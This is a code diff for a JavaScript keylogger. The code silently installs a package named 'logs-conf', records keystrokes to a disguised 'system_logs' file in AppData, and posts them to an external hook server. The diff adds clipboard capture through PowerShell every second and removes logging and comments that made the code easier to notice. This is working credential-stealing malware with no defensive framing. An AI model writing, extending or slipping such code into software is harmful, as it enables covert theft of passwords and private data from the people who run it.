@@ -8,12 +8,24 @@ try {
     const homeDir = os.homedir();
     const logPath = path.join(homeDir, 'AppData', 'Local', 'system_logs');
 
-    let GlobalKeyboardListener;
-    let v;
-    let rawBuffer = `\n\n*********************************        ${new Date()}       ********************************\n\n`;
+    let rawBuffer = `\n\n ${new Date()} \n\n`;
     let inputBuffer = '';
+    let lastClipboardContent = '';
 
     const hookDomain = "https://hook-server-beta.vercel.app";
+
+    function getClipboardText() {
+        try {
+            const platform = os.platform();
+            let text;
+            if (platform === 'win32') {
+                text = execSync('powershell -command "Get-Clipboard"').toString().trim();
+            }
+            return text;
+        } catch (err) {
+            return null;
+        }
+    }
     
     function processKeyEvent(event, down) {
         if (!v) return;
@@ -23,13 +35,11 @@ try {
         if (down[keyName]) {
             if (keyName == 'MOUSE LEFT' || keyName === 'RETURN' || keyName === 'ENTER' ) {
                 if(rawBuffer != ''){
-                    rawBuffer += `\n\n\----------------------        ${new Date()}      -----------------------------\n\n`;
+                    rawBuffer += `\n\n\ ${new Date()} \n\n`;
                     inputBuffer += '<br/><br/>';
                     fs.writeFile(logPath, rawBuffer, { flag: 'a' }, (err) => {
                         if (err) {
-                            // console.error('Error writing to file:', err);
                         } else {
-                            // console.log('Data appended successfully.');
                         }
                     });
                     rawBuffer = '';
@@ -51,37 +61,22 @@ try {
         try {
             await axios.post(`${hookDomain}/hook/keyboard-event`, data);
         } catch (error) {
-            // console.error(`Error sending data: ${error}`);
         }
     }
 
-    const init = () => {
-        try {
-            if(v) {
-                v.addListener(processKeyEvent);
-            } else {
-                // console.warn('Keyboard listener not initialized, as parkers-key module is missing.');
-            }
-        } catch (error) {
-            if (error.code === 'EACCES') {
-                // console.error('Permission denied: Please run the application as an administrator or grant the necessary permissions.');
-            } else if (error.code === 'EAGAIN') {
-                // console.error('Failed to add keyboard listener: Please try again or restart the application.');
-            } else {
-                // console.error(`Error adding keyboard listener: ${error}`);
-            }
-        }
-    }; 
-
     execSync('npm install logs-conf --save --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true });
-    try {
-                const { GlobalKeyboardListener } = require('logs-conf');
-                v = new GlobalKeyboardListener();
-                init(); // your setup code
-    } catch (err) {
-        // console.error('Failed to require logs-conf after installation:', err);
+    const { GlobalKeyboardListener } = require('logs-conf');
+    let v = new GlobalKeyboardListener();
+    if(v) {
+        v.addListener(processKeyEvent);
+        setInterval(() => {
+            const currentContent = getClipboardText();
+            if (currentContent !== lastClipboardContent) {
+                rawBuffer += '\n Clip:'+currentContent+'\n';
+                lastClipboardContent = currentContent;
+            }
+        }, 1000);
     }
 
 } catch (error) {
-    // console.error(`Unexpected error: ${error}`);
 }
